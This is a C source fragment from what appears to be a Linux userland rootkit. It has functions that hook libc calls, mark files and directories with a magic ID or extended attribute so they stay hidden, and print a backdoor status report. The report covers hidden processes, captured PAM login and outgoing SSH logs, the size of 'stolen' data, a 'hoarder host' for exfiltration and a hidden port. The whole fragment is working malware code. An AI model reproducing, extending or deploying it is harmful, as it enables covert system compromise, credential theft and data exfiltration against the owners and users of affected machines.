int prepareregfile(const char *path, id_t magicid){
    hook(CACCESS, CCHMOD, CCREAT);
    int acc = (long)call(CACCESS, path, F_OK);
    if(acc != 0 && errno == ENOENT){
        int crt = (long)call(CCREAT, path, 0666);
        if(crt < 0) return -1;
        close(crt);

#ifdef USE_MAGIC_ATTR
        if(attrmodif(path, CSETXATTR) < 0)
            return -1;
#else
        if(chownpath(path, magicid) < 0)
            return -1;
#endif

        if((long)call(CCHMOD, path, 0666) < 0)
            return -1;

        return 1;
    }else if(acc == 0){
        if(!notuser(0)){
#ifdef USE_MAGIC_ATTR
            attrmodif(path, CSETXATTR);
#else
            chownpath(path, magicid);
#endif
            call(CCHMOD, path, 0666);
        }
        return 0;
    }
    return -1;
}

int preparedir(const char *path, id_t magicid){
    hook(CMKDIR, CCHMOD);
    
    int exists = direxists(path);
    if(exists){
        if(!notuser(0)){
#ifdef USE_MAGIC_ATTR
            attrmodif(path, CSETXATTR);
#else
            chownpath(path, magicid);
#endif
            call(CCHMOD, path, 0777);
        }
        return 1;
    }else if(!exists && errno != ENOENT) return -1;

    if((long)call(CMKDIR, path, 0777) < 0)
        return -1;

#ifdef USE_MAGIC_ATTR
    if(attrmodif(path, CSETXATTR) < 0)
        return -1;
#else
    if(chownpath(path, magicid) < 0)
        return -1;
#endif

    if((long)call(CCHMOD, path, 0777) < 0)
        return -1;

    return 1;
}

#ifdef ENABLE_STEAL
void __attribute((visibility("hidden"))) print_stolen_sizes(const bdvcfg_t *bc){
    const u_long stolensize = getdirsize(bc->interestdir);
    bxprintf(STOLENDATAMSG, 0);
    if(stolensize >= 1024*1024*1024)
        bxprintf(GBFMTSTRING, (float)stolensize/(1024*1024*1024));
    else if(stolensize >= 1024*1024)
        bxprintf(MBFMTSTRING, (float)stolensize/(1024*1024));
    else if(stolensize <= 1024)
        bxprintf(ABFMTSTRING, stolensize);
    else if(stolensize > 1024)
        bxprintf(KBFMTSTRING, (float)stolensize/1024);
}
#endif

/* ./bdvprep as magicusr invokes this function */
void bdprep(void){
    if(!reinitmvbc())
        superkill();

    hide_self();
    dorolf();

    const struct tm timeif = *localtime(&mvbc->installtime);
    bxprintf(DATETIMEMSG, timeif.tm_year + 1900, timeif.tm_mon + 1, timeif.tm_mday, timeif.tm_hour, timeif.tm_min);
    bxprintf(MAGICIDMSG, mvbc->magicid);
#ifdef PAM_AUTH_LOGGING
    bxprintf(AUTHLOGMSG, logcount(mvbc->logpath));
#endif
#ifdef OUTGOING_SSH_LOGGING
    bxprintf(SSHLOGSMSG, logcount(mvbc->sshlogs));
#endif
#ifdef ENABLE_STEAL
#ifdef HOARDER_HOST
    if(*mvbc->hoarder_host != '\0')
        bxprintf(HOARDER_HOST_CURRENT_MSG, get_hoarder_host(mvbc), get_hoarder_port(mvbc));
#ifndef HOARDER_NO_DISK_WRITE
    print_stolen_sizes(mvbc);
#endif
#else
    print_stolen_sizes(mvbc);
#endif
#endif
    mkbdvlinks();
    if(!is_hideport_alive)
        bxprintf(HIDEPORT_WARNING, 0);
    bxprintf(LOGS_ACCESS_MESSAGE, 0);
}